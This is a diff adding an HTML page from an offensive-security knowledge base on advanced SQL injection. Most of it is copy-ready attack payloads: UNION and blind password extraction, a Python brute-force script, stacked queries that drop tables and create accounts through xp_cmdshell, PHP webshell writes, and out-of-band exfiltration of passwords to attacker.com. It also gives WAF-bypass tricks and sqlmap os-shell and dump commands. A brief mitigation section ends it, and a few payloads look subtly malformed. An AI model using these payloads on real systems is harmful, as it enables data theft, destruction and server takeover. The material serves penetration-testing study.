@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL Injection Deep Dive | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
+    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.8rem; font-family: 'Courier New', monospace; font-size: 0.72rem; word-break: break-all; overflow-x: auto; transition: var(--transition); cursor: pointer; }
+    .payload-item:hover { border-color: var(--primary); background: var(--bg-card); }
+    .payload-category { margin: 2rem 0 1rem; padding: 0.75rem 1rem; background: var(--bg-card); border-left: 3px solid var(--primary); border-radius: 0 0.5rem 0.5rem 0; font-weight: 600; color: var(--primary); font-size: 0.9rem; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    .warning-box { background: rgba(255,136,0,0.1); border-left: 4px solid #ff8800; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .warning-box strong { color: #ff8800; }
+    table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    th, td { padding: 0.75rem 1rem; border: 1px solid var(--border); text-align: left; }
+    th { background: var(--bg-elevated); font-weight: 600; color: var(--primary); font-size: 0.85rem; }
+    td { color: var(--text-secondary); font-size: 0.85rem; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1rem; margin: 1rem 0; }
+    .tool-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1rem; }
+    .tool-card h4 { color: var(--primary); margin-bottom: 0.5rem; font-size: 0.9rem; }
+    .tool-card p { font-size: 0.8rem; margin: 0; color: var(--text-secondary); }
+    @media (max-width: 768px) { .payload-grid { grid-template-columns: 1fr; } .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../web/index.html">Web Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Web Security</a> / Advanced SQL Injection
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-critical"><i class="fas fa-exclamation-triangle"></i> Critical Severity | CWE-89</span>
+      <h1>🔴 Advanced SQL Injection Techniques</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>CWE</strong><span>CWE-89</span></div>
+        <div class="meta-item"><strong>OWASP</strong><span>A03:2021</span></div>
+        <div class="meta-item"><strong>CVSS</strong><span>9.8 (Critical)</span></div>
+        <div class="meta-item"><strong>Detection</strong><span>Hard</span></div>
+      </div>
+    </div>
+
+    <!-- 1. OVERVIEW -->
+    <div class="content-section" id="overview">
+      <h2>🧠 Advanced SQL Injection Overview</h2>
+      <p>Beyond basic error-based injection, advanced SQL injection techniques enable attackers to extract data without visible output, escalate to OS command execution, and pivot to internal networks.</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why Learn Advanced Techniques?</strong>
+        <ul>
+          <li><strong>Blind Environments:</strong> No visible SQL errors, no database output displayed</li>
+          <li><strong>WAF Bypass:</strong> Bypass web application firewalls and filters</li>
+          <li><strong>Full Compromise:</strong> Achieve RCE and network pivoting</li>
+          <li><strong>Second-Order:</strong> Attack stored payloads executed later</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- 2. UNION INJECTION ADVANCED -->
+    <div class="content-section" id="union">
+      <h2>📊 Advanced UNION-Based Injection</h2>
+      
+      <p><strong>Column Detection with NULL:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Standard NULL test
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+# Continue until no error
+
+# Quick check for column count
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--  # Error = 2 columns</pre>
+      </div>
+
+      <p><strong>Data Type Identification:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Test data types with NULL substitution
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT 1,'a',3--
+' UNION SELECT @@version,user(),database()--
+
+# MySQL specific
+' UNION SELECT 1,table_name,3 FROM information_schema.tables--
+' UNION SELECT table_name,column_name,4 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username,password,3 FROM users--</pre>
+      </div>
+
+      <p><strong>Extracting Multiple Values:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Concatenate output
+' UNION SELECT CONCAT(username,'|',password),2,3 FROM users--
+
+# MySQL GROUP_CONCAT for large datasets
+' UNION SELECT GROUP_CONCAT(username,0x3a,password),2,3 FROM users--
+
+# Hex encoding for special characters
+' UNION SELECT HEX(username),HEX(password) FROM users--
+
+# Using LIMIT/OFFSET for pagination
+' UNION SELECT username,password,3 FROM users LIMIT 0,1--
+' UNION SELECT username,password,3 FROM users LIMIT 1,1--</pre>
+      </div>
+    </div>
+
+    <!-- 3. BLIND INJECTION -->
+    <div class="content-section" id="blind">
+      <h2>👻 Blind Boolean-Based Injection</h2>
+      
+      <p><strong>Detection Techniques:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># True condition (page loads normally)
+' OR '1'='1
+' OR 1=1--
+admin' AND 1=1--
+
+# False condition (different page/content)
+' OR '1'='2
+' OR 1=2--
+admin' AND 1=2--
+
+# Using SUBSTRING
+admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--</pre>
+      </div>
+
+      <p><strong>Binary Search for Fast Extraction:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Binary search algorithm for character extraction
+# Check if ASCII value > 64 (uppercase letter)
+admin' AND ASCII(SUBSTRING(password,1,1)) > 64--
+admin' AND ASCII(SUBSTRING(password,1,1)) > 96--  # lowercase
+admin' AND ASCII(SUBSTRING(password,1,1)) > 108--  # continue...
+
+# Alternative: BETWEEN for character ranges
+admin' AND SUBSTRING(password,1,1) BETWEEN 'a' AND 'z'--
+admin' AND SUBSTRING(password,1,1) BETWEEN 'A' AND 'Z'--
+admin' AND SUBSTRING(password,1,1) BETWEEN '0' AND '9'--</pre>
+      </div>
+
+      <p><strong>Python Script for Automation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>#!/usr/bin/env python3
+import requests
+import string
+
+charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
+url = "http://target.com/search"
+password = ""
+
+for pos in range(1, 33):  # 32 chars for MD5
+    for char in charset:
+        payload = f"admin' AND SUBSTRING(password,{pos},1)='{char}'--"
+        r = requests.get(url, params={"q": payload})
+        if "Welcome" in r.text:  # True condition
+            password += char
+            print(f"Found: {password}")
+            break
+
+print(f"Password: {password}")</pre>
+      </div>
+    </div>
+
+    <!-- 4. TIME-BASED -->
+    <div class="content-section" id="time">
+      <h2>⏱️ Time-Based Blind Injection</h2>
+      
+      <p><strong>MySQL Time-Based:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Basic delay
+' AND SLEEP(5)--
+1' AND SLEEP(5)--
+1" AND SLEEP(5)--
+
+# IF-based condition (returns 1 after delay)
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--</pre>
+      </div>
+
+      <p><strong>MSSQL Time-Based:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># WAITFOR DELAY
+'; WAITFOR DELAY '00:00:05'--
+1; WAITFOR DELAY '00:00:05'--
+
+# Conditional delay
+1'; IF(1=1) WAITFOR DELAY '00:00:05'--
+1'; IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') WAITFOR DELAY '00:00:05'--</pre>
+      </div>
+
+      <p><strong>PostgreSQL Time-Based:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># pg_sleep
+'; SELECT pg_sleep(5)--
+1' AND pg_sleep(5)--
+
+# Using CASE
+1'; CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE NULL END--</pre>
+      </div>
+
+      <p><strong>Oracle Time-Based:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># DBMS_LOCK.SLEEP
+'; BEGIN DBMS_LOCK.SLEEP(5); END;--
+
+# Using utl_http (network call instead)
+'; SELECT UTL_HTTP.REQUEST('http://attacker.com?c='||password) FROM dual--</pre>
+      </div>
+
+      <p><strong>Heavy Query for Detection:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># MySQL BENCHMARK (CPU intensive)
+1' AND BENCHMARK(5000000,SHA1('test'))--
+
+# PostgreSQL generate_series
+1'; SELECT * FROM generate_series(1,10000000);--</pre>
+      </div>
+    </div>
+
+    <!-- 5. STACKED QUERIES -->
+    <div class="content-section" id="stacked">
+      <h2>📚 Stacked Queries</h2>
+      
+      <p><strong>Multiple Statements:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># MSSQL (most reliable)
+1; DROP TABLE users--
+1; SELECT * FROM users; INSERT INTO users VALUES ('hacker','password')--
+1; EXEC xp_cmdshell 'whoami'--
+
+# MySQL (depends on driver configuration)
+1; DROP TABLE users--
+1; SELECT * FROM users; SET @x=0--
+
+# PostgreSQL
+1; DROP TABLE users--
+1; SELECT * FROM users; CREATE TABLE pwn(id int);--</pre>
+      </div>
+
+      <p><strong>MySQL INTO OUTFILE:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Write webshell
+' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+
+# Alternative using hex encoding
+' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e INTO OUTFILE '/var/www/html/shell.php'--
+
+# Write file with newline (for multiple commands)
+' UNION SELECT '<?php\neval($_POST[x]);\n?>' INTO OUTFILE '/var/www/html/shell.php'--</pre>
+      </div>
+
+      <p><strong>MSSQL xp_cmdshell:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Enable xp_cmdshell if disabled
+1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+
+# Execute commands
+1; EXEC xp_cmdshell 'whoami';--
+1; EXEC xp_cmdshell 'net user hacker Password123 /add';--
+1; EXEC xp_cmdshell 'netsh firewall set service type=disable';--</pre>
+      </div>
+    </div>
+
+    <!-- 6. OUT-OF-BAND -->
+    <div class="content-section" id="oob">
+      <h2>🌐 Out-of-Band (OAST) Injection</h2>
+      
+      <p><strong>DNS Exfiltration (MSSQL):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># DNS lookup to attacker server
+1'; DECLARE @x VARCHAR(100); SET @x='\\'+SELECT password FROM users WHERE username='admin'+'.attacker.com\\test'; EXEC('master..xp_fileexist @x');--
+
+# Using stored procedures
+1'; DECLARE @host VARCHAR(200); SELECT @host=(SELECT password FROM users WHERE username='admin')+'attacker.com'; EXEC('xp_cmdshell ''ping '+@host+'''');--</pre>
+      </div>
+
+      <p><strong>HTTP Request (Oracle):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># UTL_HTTP for HTTP requests
+1'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||password) FROM users WHERE username='admin';--
+
+# UTL_INADDR for DNS
+1'; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='admin')||'.attacker.com') FROM DUAL;--</pre>
+      </div>
+
+      <p><strong>MySQL LOAD_FILE + HTTP:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Using sys_exec
+1'; SELECT sys_exec('curl http://attacker.com/?p='+(SELECT password FROM users LIMIT 1));--
+
+# Using load_file with HTTP (via PHP wrapper)
+' UNION SELECT LOAD_FILE('http://attacker.com/?f=/etc/passwd')--</pre>
+      </div>
+
+      <p><strong>Burp Collaborator for OAST:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Generate Collaborator URL in Burp Suite
+# Use in payload
+1'; SELECT EXTRACTVALUE(1,CONCAT(0x5c,(SELECT password FROM users LIMIT 1)),'http://attacker.com'))--
+
+# Or DNS TXT record
+1'; SELECT UTL_HTTP.REQUEST('http://'||(SELECT password FROM users)||'.burpcollaborator.net');--</pre>
+      </div>
+    </div>
+
+    <!-- 7. WAF BYPASS -->
+    <div class="content-section" id="waf">
+      <h2>🛡️ WAF Bypass Techniques</h2>
+      
+      <p><strong>Comment Obfuscation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Inline comments (MySQL)
+UN/**/ION SEL/**/ECT
+/*!UNION*/ /*!SELECT*/
+UN/**/ION/**/SELECT/**/NULL
+
+# Version-specific (only executes on specific versions)
+/*!50000 UNION*/  # MySQL 5.0.00+
+
+# Chained comments
+/**/UNION/**/SELECT/**/</pre>
+      </div>
+
+      <p><strong>URL Encoding:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Double URL encode
+%2527  (decoded to %27 then to ')
+%55NION  (U -> %55)
+%20SELECT (space -> %20)
+
+# Unicode encode
+\u0055NION  (non-standard but sometimes works)
+\u0027 (')
+
+# Mixed encoding
+UN%16ION</pre>
+      </div>
+
+      <p><strong>Case Manipulation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Case variation (SQL is case-insensitive)
+uNiOn SeLeCt
+UNION SELECT
+SelEcT
+
+# Mixed case
+UnIoN SeLeCt 1,2,3--</pre>
+      </div>
+
+      <p><strong>Whitespace Alternatives:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Tab, newline, carriage return
+UNION\tSELECT
+UNION\nSELECT
+UNION%09SELECT
+UNION%0aSELECT
+UNION%0dSELECT
+
+# Alternative characters
+UNION%0bSELECT
+UNION%0cSELECT
+/**/UNION/**/SELECT/**/</pre>
+      </div>
+
+      <p><strong>Keyword Replacement Bypass:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Replace blocked keywords
+UNION -> UN\nION (newline breaks detection)
+SELECT -> SEL\nECT
+OR -> || (logical OR in some contexts)
+AND -> && (logical AND)
+OR -> ORR (append garbage)
+
+# Using LIKE
+' OR username LIKE 'admin'--
+' OR password LIKE '%a%'--</pre>
+      </div>
+
+      <p><strong>HTTP Parameter Pollution:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Duplicate parameters
+id=1 UNION SELECT&id=1 NULL--
+id=1 UNION SELECT&id=password FROM users--
+
+# Different encoding per instance
+id=1%2527  # first
+id=1%27    # second</pre>
+      </div>
+    </div>
+
+    <!-- 8. SQLMAP ADVANCED -->
+    <div class="content-section" id="sqlmap">
+      <h2>🔧 SQLMap Advanced Usage</h2>
+      
+      <p><strong>Technique Selection:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Specify technique (B=Boolean, E=Error-based, U=Union, S=Stacked, T=Time-based)
+sqlmap -u "http://target.com/?id=1" --technique=U
+sqlmap -u "http://target.com/?id=1" --technique=B
+sqlmap -u "http://target.com/?id=1" --technique=T
+
+# All techniques with delay
+sqlmap -u "http://target.com/?id=1" --technique=T --time-sec=10
+
+# Stacked queries (MySQL)
+sqlmap -u "http://target.com/?id=1" --technique=S
+sqlmap -u "http://target.com/?id=1" --dbms=mysql --batch</pre>
+      </div>
+
+      <p><strong>Level/Risk Tuning:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Level 1-5 (payload variations)
+sqlmap -u "http://target.com/?id=1" --level=5
+
+# Risk 1-3 (aggressive payloads)
+sqlmap -u "http://target.com/?id=1" --risk=3
+
+# Combined (max coverage)
+sqlmap -u "http://target.com/?id=1" --level=5 --risk=3</pre>
+      </div>
+
+      <p><strong>WAF Bypass with Tamper Scripts:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Multiple tamper scripts
+sqlmap -u "http://target.com/?id=1" --tamper=space2comment,randomcase,charencode
+
+# Available tamperp scripts:
+# space2comment     - Replace space with /**/
+# between           - Replace > with BETWEEN
+# charencode        - URL encode characters
+# randomcase        - Random case variation
+# space2dash        - Replace space with --
+# logicalbypass     - Replace AND/OR with &&/||
+# space2hash        - Replace space with ###
+# charunicodeencode - Unicode encode
+# space2plus        - Replace space with +
+
+# Custom tamper (save as mytamper.py)
+sqlmap -u "http://target.com/?id=1" --tamper=mytamper.py</pre>
+      </div>
+
+      <p><strong>Shell Access:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># OS shell
+sqlmap -u "http://target.com/?id=1" --os-shell
+
+# OS command execution
+sqlmap -u "http://target.com/?id=1" --os-cmd="whoami"
+
+# SQL shell (interactive)
+sqlmap -u "http://target.com/?id=1" --sql-shell
+
+# Interactive Metasploit
+sqlmap -u "http://target.com/?id=1" --priv-esc  # Windows only</pre>
+      </div>
+
+      <p><strong>Data Extraction:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Dump all databases
+sqlmap -u "http://target.com/?id=1" --dump-all
+
+# Specific table
+sqlmap -u "http://target.com/?id=1" -D database -T users --dump
+
+# Search for password columns
+sqlmap -u "http://target.com/?id=1" --search -C password
+
+# Read file from system
+sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"</pre>
+      </div>
+    </div>
+
+    <!-- 9. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Defense Against SQL Injection</h2>
+
+      <div class="mitigation-box">
+        <strong>✅ Primary Defense - Parameterized Queries:</strong>
+        <pre style="color: var(--text-secondary); margin-top: 0.5rem; font-size: 0.85rem;"># PHP (PDO)
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
+$stmt->execute(['username' => $user]);
+
+# Java (PreparedStatement)
+PreparedStatement ps = conn.prepareStatement(
+    "SELECT * FROM users WHERE username = ?");
+ps.setString(1, username);
+
+# Python (psycopg2)
+cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+
+# Node.js (parameterized)
+db.query('SELECT * FROM users WHERE username = $1', [username])</pre>
+      </div>
+
+      <p><strong>Additional Mitigations:</strong></p>
+      <ul>
+        <li><strong>Input Validation:</strong> Whitelist validation, type checking</li>
+        <li><strong>Least Privilege:</strong> Database accounts with minimal permissions</li>
+        <li><strong>Web Application Firewall:</strong> ModSecurity, Cloudflare, AWS WAF</li>
+        <li><strong>Error Handling:</strong> Generic error messages, no stack traces</li>
+        <li><strong>HTTPS Only:</strong> Encrypt all database communications</li>
+        <li><strong>Regular Audits:</strong> Code reviews, penetration testing</li>
+      </ul>
+    </div>
+
+    <!-- 10. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank">PayloadsAllTheThings SQL Injection</a></li>
+        <li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank">SQLMap Wiki</a></li>
+        <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger SQL Injection</a></li>
+      </ul>
+    </div>
+
+    <a href="sql-injection.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to SQL Injection</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => btn.textContent = 'Copy', 2000);
+}
+</script>
+
+</body>
+</html>
